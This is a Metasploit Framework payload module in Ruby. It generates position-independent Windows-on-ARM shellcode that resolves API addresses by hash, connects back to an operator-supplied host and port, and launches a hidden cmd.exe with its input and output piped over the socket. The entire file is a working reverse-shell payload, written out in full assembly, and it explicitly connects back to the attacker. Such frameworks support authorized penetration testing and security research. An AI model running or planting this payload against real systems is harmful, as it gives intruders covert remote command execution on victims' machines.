# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 664

  include Msf::Payload::Windows
  include Msf::Payload::Windows::Aarch64
  include Msf::Payload::Windows::Exitfunk_Aarch64
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows AArch64 Command Shell, Reverse TCP Inline',
        'Description' => %q{
          Connect back to the attacker and spawn a Windows command shell on a
          Windows on ARM (AArch64) target. Position-independent shellcode that
          resolves API addresses via PEB / Export Address Table hashing
          (Stephen Fewer ROR-13), opens a TCP socket through Winsock, calls
          WSAConnect, then spawns cmd.exe with stdin/stdout/stderr piped over
          the socket via CreateProcessA + STARTF_USESTDHANDLES. EXITFUNC is
          honored via a runtime hash-dispatcher.
        },
        'Author' => [
          'vinicius-batistella' # AArch64 reverse_tcp port from the x64 stager logic
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_AARCH64,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'Payload' => { 'Offsets' => {}, 'Payload' => '' }
      )
    )
  end

  def generate(_opts = {})
    lhost = datastore['LHOST']
    unless Rex::Socket.is_ipv4?(lhost)
      raise ArgumentError, 'LHOST must be in IPv4 format.'
    end

    ip_bytes = Rex::Socket.addr_aton(lhost)

    # Map LHOST/LPORT onto the MOVK immediates inside fill_sockaddr_fast.
    # sin_port:  network-order bytes loaded as a little-endian 16-bit imm.
    # sin_addr:  octets 0..1 -> low halfword, octets 2..3 -> high halfword.
    port_imm = [datastore['LPORT'].to_i].pack('n').unpack1('v')
    ip_lo_imm = ip_bytes[0, 2].unpack1('v')
    ip_hi_imm = ip_bytes[2, 2].unpack1('v')

    asm = build_asm(
      port_imm: port_imm,
      ip_lo_imm: ip_lo_imm,
      ip_hi_imm: ip_hi_imm,
      exitfunk: datastore['EXITFUNC']
    )

    compile_aarch64(asm)
  end

  private

  def build_asm(port_imm:, ip_lo_imm:, ip_hi_imm:, exitfunk:)
    # Differences from the standalone rev2.s prototype:
    #   - `.text` / `.global` directives stripped (aarch64 gem rejects them)
    #   - `[reg, wreg, uxtw #N]` rewritten as `mov w15, w4; lsl x15, x15, #N;
    #     add x15, base, x15; ldr ...` to avoid extended-register addressing
    #     in the aarch64 gem parser
    #   - constant expressions like `(12*2)` pre-evaluated to literals
    #   - `mov x0, #-1` replaced with `movn x0, #0` (canonical encoding)
    #
    # Slot table (x29 + offset):
    #   0x00 kernel32_base  0x08 &find_function  0x18 LoadLibraryA
    #   0x28 WSAStartup     0x30 WSASocketA      0x38 WSAConnect
    #   0x40 CreateProcessA 0x50 sockaddr_in     0x70 WSADATA
    # Gaps at 0x10 and 0x20 are intentional -- previously held cached
    # TerminateProcess (re-resolved by exitfunk now) and OpenProcessToken
    # (was unused dead code), preserved to keep slot offsets stable.
    asm = <<~ASM
      main:
        sub     sp, sp, #0x300
        mov     x29, sp
        add     x19, x29, #0x50
        add     x21, x29, #0x70
    ASM
    asm += asm_block_api_aarch64
    asm += <<~ASM
      resolve_symbols_kernel32:
        str     x3, [x29, #0x00]

        movz    w0, #0x4e8e
        movk    w0, #0xec0e, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x18]

      resolve_symbols_CreateProcessA:
        movz    w0, #0xfe72
        movk    w0, #0x16b3, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x40]

      load_ws2_32:
        movz    x0, #0x7357
        movk    x0, #0x5f32, lsl #16
        movk    x0, #0x3233, lsl #32
        movk    x0, #0x642e, lsl #48
        movz    w1, #0x6c6c
        sub     sp, sp, #16
        str     x0, [sp]
        str     w1, [sp, #8]
        mov     x0, sp
        ldr     x9, [x29, #0x18]
        blr     x9
        add     sp, sp, #16
        mov     x3, x0

      resolve_ws2_32:
        movz    w0, #0xedcb
        movk    w0, #0x3bfc, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x28]

        movz    w0, #0x09d9
        movk    w0, #0xadf5, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x30]

        movz    w0, #0xba0c
        movk    w0, #0xb32d, lsl #16
        ldr     x9, [x29, #0x08]
        blr     x9
        str     x0, [x29, #0x38]

      call_WSAStartup:
        movz    w0, #0x0202
        mov     x1, x21
        ldr     x9, [x29, #0x28]
        blr     x9

      call_WSASocket:
        mov     w0, #2
        mov     w1, #1
        mov     w2, #6
        mov     x3, xzr
        mov     w4, wzr
        mov     w5, wzr
        ldr     x9, [x29, #0x30]
        blr     x9
        mov     x22, x0

      fill_sockaddr_fast:
        movz    x0, #0x0002
        movk    x0, ##{format('0x%04x', port_imm)}, lsl #16
        movk    x0, ##{format('0x%04x', ip_lo_imm)}, lsl #32
        movk    x0, ##{format('0x%04x', ip_hi_imm)}, lsl #48
        stp     x0, xzr, [x19]

      call_WSAConnect:
        mov     x0, x22
        mov     x1, x19
        mov     w2, #16
        mov     x3, xzr
        mov     x4, xzr
        mov     x5, xzr
        mov     x6, xzr
        ldr     x9, [x29, #0x38]
        blr     x9

      build_PROCESS_INFORMATION_and_STARTUPINFOA:
        sub     sp, sp, #0xB0
        add     x10, sp, #0x10
        add     x11, sp, #0x30
        add     x12, sp, #0xA0

        stp     xzr, xzr, [x10]
        str     xzr, [x10, #16]

        stp     xzr, xzr, [x11, #0x00]
        stp     xzr, xzr, [x11, #0x10]
        stp     xzr, xzr, [x11, #0x20]
        stp     xzr, xzr, [x11, #0x30]
        stp     xzr, xzr, [x11, #0x40]
        stp     xzr, xzr, [x11, #0x50]
        str     xzr,      [x11, #0x60]

        mov     w0, #0x68
        str     w0, [x11, #0x00]
        // STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; wShowWindow stays 0 (SW_HIDE)
        mov     w0, #0x101
        str     w0, [x11, #0x3C]
        str     x22, [x11, #0x50]
        str     x22, [x11, #0x58]
        str     x22, [x11, #0x60]

        movz    x0, #0x6D63
        movk    x0, #0x2E64, lsl #16
        movk    x0, #0x7865, lsl #32
        movk    x0, #0x0065, lsl #48
        str     x0, [x12]

      call_CreateProcessA:
        mov     x0, xzr
        mov     x1, x12
        mov     x2, xzr
        mov     x3, xzr
        mov     w4, #1
        // CREATE_NO_WINDOW — hides cmd/conhost on modern Windows (0x101 alone is not enough)
        movz    w5, #0x0800, lsl #16
        mov     x6, xzr
        mov     x7, xzr
        stp     x11, x10, [sp]

        ldr     x9, [x29, #0x40]
        blr     x9

        add     sp, sp, #0xB0
    ASM
    asm + asm_exitfunk_aarch64(exitfunk: exitfunk)
  end
end
